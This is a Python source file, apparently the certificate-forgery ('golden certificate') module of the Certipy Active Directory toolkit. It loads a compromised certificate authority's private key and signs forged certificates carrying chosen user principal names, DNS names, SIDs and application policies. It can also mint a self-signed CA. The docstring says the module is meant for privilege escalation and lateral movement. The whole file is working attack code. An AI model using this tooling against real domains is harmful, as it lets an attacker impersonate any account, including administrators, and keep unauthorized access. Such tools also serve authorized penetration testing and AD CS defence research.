"""
Certificate Forgery (aka Golden Certificates) Module for Certipy.

This module allows forging certificates by signing them with a compromised CA private key.
It supports several features:
- Creating certificates with custom subject alternative names (UPN, DNS)
- Including SID extensions for domain authentication
- Using existing certificates as templates
- Customizing certificate validity periods and serial numbers
- Adding CRL distribution points

This is useful for privilege escalation and lateral movement scenarios where a CA
certificate and private key have been compromised.
"""

import argparse
import datetime
from pathlib import Path
from typing import List, Optional, Tuple, Union, cast

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.types import (
    CertificateIssuerPrivateKeyTypes,
    CertificateIssuerPublicKeyTypes,
    PrivateKeyTypes,
)
from pyasn1.codec.der import encoder

from certipy.lib.certificate import (
    APPLICATION_POLICIES,
    NTDS_CA_SECURITY_EXT,
    OID_NTDS_OBJECTSID,
    PRINCIPAL_NAME,
    SAN_URL_PREFIX,
    SMIME_CAPABILITIES,
    SMIME_MAP,
    UTF8String,
    asn1x509,
    cert_id_to_parts,
    create_pfx,
    generate_rsa_key,
    get_subject_from_str,
    load_pfx,
    x509,
)
from certipy.lib.constants import OID_TO_STR_NAME_MAP
from certipy.lib.errors import handle_error
from certipy.lib.files import try_to_save_file
from certipy.lib.logger import logging

# List of secure hash algorithms
AllowedSignatureAlgorithms = Union[
    hashes.SHA224,
    hashes.SHA256,
    hashes.SHA384,
    hashes.SHA512,
    hashes.SHA3_224,
    hashes.SHA3_256,
    hashes.SHA3_384,
    hashes.SHA3_512,
]


class Forge:
    """
    Certificate forgery class for creating and signing custom certificates.

    This class provides functionality to forge certificates by signing them with
    a compromised CA private key, allowing creation of certificates with custom
    properties that can be used for authentication in Active Directory environments.
    """

    def __init__(
        self,
        ca_pfx: Optional[str] = None,
        ca_password: Optional[str] = None,
        upn: Optional[str] = None,
        dns: Optional[str] = None,
        sid: Optional[str] = None,
        subject: Optional[str] = None,
        template: Optional[str] = None,
        application_policies: Optional[List[str]] = None,
        smime: Optional[str] = None,
        issuer: Optional[str] = None,
        crl: Optional[str] = None,
        serial: Optional[str] = None,
        key_size: int = 2048,
        validity_period: int = 365,
        out: Optional[str] = None,
        pfx_password: Optional[str] = None,
        **kwargs,  # type: ignore
    ):
        """
        Initialize the certificate forgery parameters.

        Args:
            ca_pfx: Path to the CA certificate/private key in PFX format
            ca_password: Password for the CA PFX file
            upn: User Principal Name for the certificate (e.g., user@domain.com)
            dns: DNS name for the certificate (e.g., computer.domain.com)
            sid: Security Identifier to include in the certificate
            subject: Subject name (in DN format) for the certificate
            template: Path to an existing certificate to use as a template
            application_policies: List of application policy OIDs
            smime: SMIME capability identifier
            issuer: Issuer name (in DN format) for the certificate
            crl: URI for the CRL distribution point
            serial: Custom serial number (in hex format, colons optional)
            key_size: RSA key size in bits for new certificates
            validity_period: Validity period in days for new certificates
            out: Output file path for the forged certificate
            pfx_password: Password for the PFX file
            kwargs: Additional arguments (not used)
        """
        self.ca_pfx = ca_pfx
        self.ca_password = ca_password.encode() if ca_password else None
        self.alt_upn = upn
        self.alt_dns = dns
        self.alt_sid = sid
        self.subject = subject
        self.template = template
        self.issuer = issuer
        self.crl = crl
        self.serial = serial
        self.key_size = key_size
        self.validity_period = validity_period
        self.out = out
        self.pfx_password = pfx_password
        self.kwargs = kwargs

        # Convert application policy names to OIDs
        self.application_policies = [
            OID_TO_STR_NAME_MAP.get(policy.lower(), policy)
            for policy in (application_policies or [])
        ]
        self.smime = smime

    def get_serial_number(self) -> int:
        """
        Get the certificate serial number.

        Returns:
            Integer representation of the serial number
        """
        if self.serial is None:
            return x509.random_serial_number()

        # Clean up colons if present and convert hex to int
        return int(self.serial.replace(":", ""), 16)

    def get_crl(
        self, crl: Optional[str] = None
    ) -> Optional[x509.CRLDistributionPoints]:
        """
        Create a CRL distribution point extension.

        Args:
            crl: URI of the CRL distribution point (defaults to self.crl)

        Returns:
            CRL distribution points extension or None if no CRL specified
        """
        if crl is None:
            crl = self.crl

        if not crl:
            return None

        return x509.CRLDistributionPoints(
            [
                x509.DistributionPoint(
                    full_name=[x509.UniformResourceIdentifier(crl)],
                    relative_name=None,
                    reasons=None,
                    crl_issuer=None,
                )
            ]
        )

    def load_ca_certificate_and_key(
        self,
    ) -> Tuple[CertificateIssuerPrivateKeyTypes, x509.Certificate]:
        """
        Load the CA certificate and private key from the PFX file.

        Returns:
            Tuple of (CA private key, CA certificate)

        Raises:
            ValueError: If CA PFX file is not specified
            FileNotFoundError: If CA PFX file does not exist
            Exception: If loading the CA certificate or private key fails
        """
        if not self.ca_pfx:
            raise ValueError("CA PFX file is required")

        ca_pfx_path = Path(self.ca_pfx)
        if not ca_pfx_path.exists():
            raise FileNotFoundError(f"CA PFX file not found: {self.ca_pfx}")

        with open(ca_pfx_path, "rb") as f:
            ca_pfx_data = f.read()

        ca_key, ca_cert = load_pfx(ca_pfx_data, self.ca_password)

        if ca_cert is None:
            raise Exception("Failed to load CA certificate")

        if ca_key is None:
            raise Exception("Failed to load CA private key")

        # Verify we have the correct types
        ca_private_key = cast(CertificateIssuerPrivateKeyTypes, ca_key)

        return ca_private_key, ca_cert

    def create_subject_alternative_names(
        self,
    ) -> List[Union[x509.DNSName, x509.OtherName]]:
        """
        Create subject alternative names for the certificate.

        Returns:
            List of subject alternative name entries
        """
        sans = []

        # Add DNS name if specified
        if self.alt_dns:
            dns_name = self.alt_dns
            if isinstance(dns_name, bytes):
                dns_name = dns_name.decode()

            sans.append(x509.DNSName(dns_name))

        # Add UPN if specified
        if self.alt_upn:
            upn_value = self.alt_upn.encode()

            # Encode as UTF8String for UPN
            encoded_upn = encoder.encode(UTF8String(upn_value))
            sans.append(x509.OtherName(PRINCIPAL_NAME, encoded_upn))

        # Add SID if specified
        if self.alt_sid:
            sid = self.alt_sid
            if isinstance(sid, bytes):
                sid = sid.decode()

            sid = f"{SAN_URL_PREFIX}{sid}"

            sans.append(x509.UniformResourceIdentifier(sid))

        return sans

    def create_sid_extension(self) -> Optional[x509.UnrecognizedExtension]:
        """
        Create an extension containing the SID for the certificate.

        Returns:
            UnrecognizedExtension containing the SID or None if no SID specified
        """
        if not self.alt_sid:
            return None

        sid_value = self.alt_sid.encode()

        # Create ASN.1 structure for SID extension
        sid_extension = asn1x509.GeneralNames(
            [
                asn1x509.GeneralName(
                    {
                        "other_name": asn1x509.AnotherName(
                            {
                                "type_id": OID_NTDS_OBJECTSID,
                                "value": asn1x509.OctetString(sid_value).retag(
                                    {"explicit": 0}
                                ),
                            }
                        )
                    }
                )
            ]
        )

        return x509.UnrecognizedExtension(NTDS_CA_SECURITY_EXT, sid_extension.dump())

    def create_application_policies(self) -> Optional[x509.UnrecognizedExtension]:
        """
        Create an extension containing the application policies for the certificate.

        Returns:
            UnrecognizedExtension containing the application policies or None if not specified
        """
        if not self.application_policies:
            return None

        # Convert each policy OID string to PolicyIdentifier
        application_policy_oids = [
            asn1x509.PolicyInformation(
                {"policy_identifier": asn1x509.PolicyIdentifier(ap)}
            )
            for ap in self.application_policies
        ]

        # Create certificate policies extension
        cert_policies = asn1x509.CertificatePolicies(application_policy_oids)

        return x509.UnrecognizedExtension(APPLICATION_POLICIES, cert_policies.dump())

    def create_smime_extension(self) -> Optional[x509.UnrecognizedExtension]:
        """
        Create an extension containing the S/MIME capability for the certificate.

        Returns:
            UnrecognizedExtension containing the S/MIME capability or None if not specified
        """
        if not self.smime:
            return None

        # Create S/MIME capability extension
        smime_capability = SMIME_MAP[self.smime]

        return x509.UnrecognizedExtension(
            SMIME_CAPABILITIES, asn1x509.ObjectIdentifier(smime_capability).dump()
        )

    def get_allowed_hash_algorithm(
        self, template_hash_algorithm: Optional[hashes.HashAlgorithm]
    ) -> AllowedSignatureAlgorithms:
        """
        Get an appropriate hash algorithm for certificate signing.

        Args:
            template_hash_algorithm: Hash algorithm from template certificate

        Returns:
            Hash algorithm instance to use for signing
        """
        # Default to SHA-256 if no algorithm specified
        if template_hash_algorithm is None:
            return hashes.SHA256()

        # Get the algorithm class (not instance)
        alg_class = template_hash_algorithm.__class__

        # Check if algorithm is in the allowed list
        if alg_class in AllowedSignatureAlgorithms.__args__:
            return cast(AllowedSignatureAlgorithms, template_hash_algorithm)

        # Fall back to SHA-256 if not allowed
        logging.warning(
            f"Hash algorithm {alg_class.__name__} is not allowed. Using SHA256."
        )
        return hashes.SHA256()

    def build_from_template(
        self,
        ca_private_key: CertificateIssuerPrivateKeyTypes,
        ca_public_key: CertificateIssuerPublicKeyTypes,
        ca_cert: x509.Certificate,
    ) -> Tuple[PrivateKeyTypes, bytes]:
        """
        Build a certificate using an existing certificate as a template.

        Args:
            ca_private_key: CA private key
            ca_public_key: CA public key
            ca_cert: CA certificate

        Returns:
            Tuple of (certificate private key, PFX data)

        Raises:
            Exception: If loading the template fails
        """
        if not self.template:
            raise ValueError("Template path is required")

        # Load template certificate
        with open(self.template, "rb") as f:
            template_pfx = f.read()

        key, template_cert = load_pfx(template_pfx)

        if key is None:
            raise Exception("Failed to load template private key")

        if template_cert is None:
            raise Exception("Failed to load template certificate")

        # Determine subject name
        subject = self.subject
        if subject is None:
            subject = template_cert.subject
        else:
            subject = get_subject_from_str(subject)

        # Determine serial number
        serial_number = (
            self.get_serial_number() if self.serial else template_cert.serial_number
        )

        # Start building certificate
        cert_builder = x509.CertificateBuilder()
        cert_builder = cert_builder.subject_name(subject)

        # Set issuer name
        if self.issuer:
            cert_builder = cert_builder.issuer_name(get_subject_from_str(self.issuer))
        else:
            cert_builder = cert_builder.issuer_name(ca_cert.subject)

        # Set public key, serial number, and validity period
        cert_builder = cert_builder.public_key(template_cert.public_key())
        cert_builder = cert_builder.serial_number(serial_number)
        cert_builder = cert_builder.not_valid_before(template_cert.not_valid_before_utc)
        cert_builder = cert_builder.not_valid_after(template_cert.not_valid_after_utc)

        # Add authority key identifier
        cert_builder = cert_builder.add_extension(
            x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_public_key),
            False,
        )

        # List of extensions to skip from the template
        skip_extensions = [
            x509.AuthorityKeyIdentifier.oid,
            x509.SubjectAlternativeName.oid,
            x509.ExtendedKeyUsage.oid,
            NTDS_CA_SECURITY_EXT,
        ]

        # Add CRL distribution point if specified
        crl_extension = self.get_crl()
        if crl_extension:
            skip_extensions.append(x509.CRLDistributionPoints.oid)
            cert_builder = cert_builder.add_extension(crl_extension, False)

        # Add S/MIME capability if specified
        smime_extension = self.create_smime_extension()
        if smime_extension:
            skip_extensions.append(SMIME_CAPABILITIES)
            cert_builder = cert_builder.add_extension(smime_extension, False)

        # Add application policies if specified
        application_policies_extension = self.create_application_policies()
        if application_policies_extension:
            skip_extensions.append(APPLICATION_POLICIES)
            cert_builder = cert_builder.add_extension(
                application_policies_extension, False
            )

        # Copy remaining extensions from template
        extensions = template_cert.extensions
        for extension in extensions:
            if extension.oid in skip_extensions:
                continue
            cert_builder = cert_builder.add_extension(
                extension.value, extension.critical
            )

        # Add subject alternative names
        sans = self.create_subject_alternative_names()
        if sans:
            cert_builder = cert_builder.add_extension(
                x509.SubjectAlternativeName(sans),
                False,
            )

        # Add SID extension if specified
        sid_extension = self.create_sid_extension()
        if sid_extension:
            cert_builder = cert_builder.add_extension(
                sid_extension,
                False,
            )

        # Get appropriate hash algorithm
        signature_hash_alg = self.get_allowed_hash_algorithm(
            template_cert.signature_hash_algorithm
        )

        # Sign the certificate
        certificate = cert_builder.sign(ca_private_key, signature_hash_alg)

        # Create PFX
        pfx_data = create_pfx(key, certificate, self.pfx_password)

        return key, pfx_data

    def build_new_certificate(
        self,
        ca_private_key: CertificateIssuerPrivateKeyTypes,
        ca_public_key: CertificateIssuerPublicKeyTypes,
        ca_cert: x509.Certificate,
    ) -> Tuple[rsa.RSAPrivateKey, bytes]:
        """
        Build a new certificate without a template.

        Args:
            ca_private_key: CA private key
            ca_public_key: CA public key
            ca_cert: CA certificate

        Returns:
            Tuple of (certificate private key, PFX data)
        """
        # Generate new key pair
        key = generate_rsa_key(self.key_size)

        # Determine identification type and value
        if self.alt_upn:
            id_type, id_value = "UPN", self.alt_upn
        else:
            id_type, id_value = "DNS Host Name", self.alt_dns

        # Determine subject name
        subject = self.subject
        if subject is None:
            subject = get_subject_from_str(
                f"CN={cert_id_to_parts([(id_type, id_value)])[0]}"
            )
        else:
            subject = get_subject_from_str(subject)

        # Determine serial number
        serial_number = self.get_serial_number()

        # Calculate validity period
        not_valid_before = datetime.datetime.now(
            datetime.timezone.utc
        ) - datetime.timedelta(days=1)
        not_valid_after = datetime.datetime.now(
            datetime.timezone.utc
        ) + datetime.timedelta(days=self.validity_period)

        # Start building certificate
        cert_builder = x509.CertificateBuilder()
        cert_builder = cert_builder.subject_name(subject)

        # Set issuer name
        if self.issuer:
            cert_builder = cert_builder.issuer_name(get_subject_from_str(self.issuer))
        else:
            cert_builder = cert_builder.issuer_name(ca_cert.subject)

        # Set public key, serial number, and validity period
        cert_builder = cert_builder.public_key(key.public_key())
        cert_builder = cert_builder.serial_number(serial_number)
        cert_builder = cert_builder.not_valid_before(not_valid_before)
        cert_builder = cert_builder.not_valid_after(not_valid_after)

        # Add key identifiers
        cert_builder = cert_builder.add_extension(
            x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_public_key),
            False,
        )
        cert_builder = cert_builder.add_extension(
            x509.SubjectKeyIdentifier.from_public_key(key.public_key()),
            False,
        )

        # Add CRL distribution point if specified
        crl_extension = self.get_crl()
        if crl_extension:
            cert_builder = cert_builder.add_extension(crl_extension, False)

        # Add S/MIME capability if specified
        smime_extension = self.create_smime_extension()
        if smime_extension:
            cert_builder = cert_builder.add_extension(smime_extension, False)

        # Add application policies if specified
        application_policies_extension = self.create_application_policies()
        if application_policies_extension:
            cert_builder = cert_builder.add_extension(
                application_policies_extension, False
            )

        # Add subject alternative names
        sans = self.create_subject_alternative_names()
        if sans:
            cert_builder = cert_builder.add_extension(
                x509.SubjectAlternativeName(sans),
                False,
            )

        # Add SID extension if specified
        sid_extension = self.create_sid_extension()
        if sid_extension:
            cert_builder = cert_builder.add_extension(
                sid_extension,
                False,
            )

        # Get appropriate hash algorithm (default to same as CA cert)
        signature_hash_alg = self.get_allowed_hash_algorithm(
            ca_cert.signature_hash_algorithm
        )

        # Sign the certificate
        certificate = cert_builder.sign(ca_private_key, signature_hash_alg)

        # Create PFX
        pfx_data = create_pfx(key, certificate, self.pfx_password)

        return key, pfx_data

    def determine_output_filename(self, id_type: str, id_value: Optional[str]) -> str:
        """
        Determine the output filename for the forged certificate.

        Args:
            id_type: Identification type (UPN, DNS)
            id_value: Identification value

        Returns:
            Output filename
        """
        # Use specified output filename if provided
        if self.out:
            return self.out

        # Try to generate filename from certificate ID
        name, _ = cert_id_to_parts([(id_type, id_value)])
        if not name:
            logging.warning(
                "Failed to generate output filename from certificate ID. Using current timestamp."
            )
            name = datetime.datetime.now().strftime("%Y%m%d%H%M%S")

        # Clean up and format filename
        return f"{name.rstrip('$').lower()}_forged.pfx"

    def forge(self) -> None:
        """
        Forge a certificate with the specified parameters.

        This is the main method that performs the certificate forgery process.

        Raises:
            ValueError: If required parameters are missing
            Exception: If certificate forgery fails
        """
        # Load CA certificate and private key
        ca_private_key, ca_cert = self.load_ca_certificate_and_key()
        ca_public_key = ca_private_key.public_key()

        # Determine identification type and value for filename
        if self.alt_upn:
            id_type, id_value = "UPN", self.alt_upn
        else:
            id_type, id_value = "DNS Host Name", self.alt_dns

        # Build certificate (from template or new)
        if self.template:
            _, pfx = self.build_from_template(ca_private_key, ca_public_key, ca_cert)
        else:
            _, pfx = self.build_new_certificate(ca_private_key, ca_public_key, ca_cert)

        # Save PFX to file
        out_path = self.determine_output_filename(id_type, id_value)

        logging.info(f"Saving forged certificate and private key to {out_path!r}")
        out_path = try_to_save_file(pfx, out_path)
        logging.info(f"Wrote forged certificate and private key to {out_path!r}")

    def create_self_signed_ca(self) -> None:
        """
        Create a self-signed CA certificate.

        This method generates a self-signed CA certificate and saves it to the specified output file.
        """
        # Generate new key pair
        key = generate_rsa_key(self.key_size)

        # Create self-signed CA certificate
        subject = x509.Name(
            [
                x509.NameAttribute(x509.NameOID.COMMON_NAME, "Certipy CA"),
            ]
        )
        if self.subject:
            subject = get_subject_from_str(self.subject)
        else:
            logging.warning("No subject specified, using default: 'Certipy CA'")
        issuer = subject

        # Set serial number and validity period
        serial_number = self.get_serial_number()
        not_valid_before = datetime.datetime.now(
            datetime.timezone.utc
        ) - datetime.timedelta(days=1)
        not_valid_after = datetime.datetime.now(
            datetime.timezone.utc
        ) + datetime.timedelta(days=self.validity_period)

        # Start building certificate
        cert_builder = x509.CertificateBuilder()
        cert_builder = cert_builder.subject_name(subject)
        cert_builder = cert_builder.issuer_name(issuer)
        cert_builder = cert_builder.public_key(key.public_key())
        cert_builder = cert_builder.serial_number(serial_number)
        cert_builder = cert_builder.not_valid_before(not_valid_before)
        cert_builder = cert_builder.not_valid_after(not_valid_after)

        # Add key identifiers
        cert_builder = cert_builder.add_extension(
            x509.AuthorityKeyIdentifier.from_issuer_public_key(key.public_key()),
            False,
        )
        cert_builder = cert_builder.add_extension(
            x509.SubjectKeyIdentifier.from_public_key(key.public_key()),
            False,
        )

        # Sign the certificate
        signature_hash_alg = hashes.SHA256()
        certificate = cert_builder.sign(key, signature_hash_alg)

        # Create PFX
        pfx_data = create_pfx(key, certificate, self.pfx_password)

        # Save PFX to file
        out_path = self.out
        if out_path is None:
            out_path = "ca.pfx"
        if not out_path.endswith(".pfx"):
            out_path += ".pfx"
        logging.info(f"Saving self-signed CA certificate to {out_path!r}")
        out_path = try_to_save_file(pfx_data, out_path)
        logging.info(f"Wrote self-signed CA certificate to {out_path!r}")


def entry(options: argparse.Namespace) -> None:
    """
    Command-line entry point for certificate forgery.

    Args:
        options: Command line arguments
    """
    try:
        # Create and run the forger
        forge = Forge(**vars(options))

        if options.ca_pfx:
            forge.forge()
        else:
            forge.create_self_signed_ca()
    except Exception as e:
        logging.error(f"Certificate forgery failed: {e}")
        handle_error()
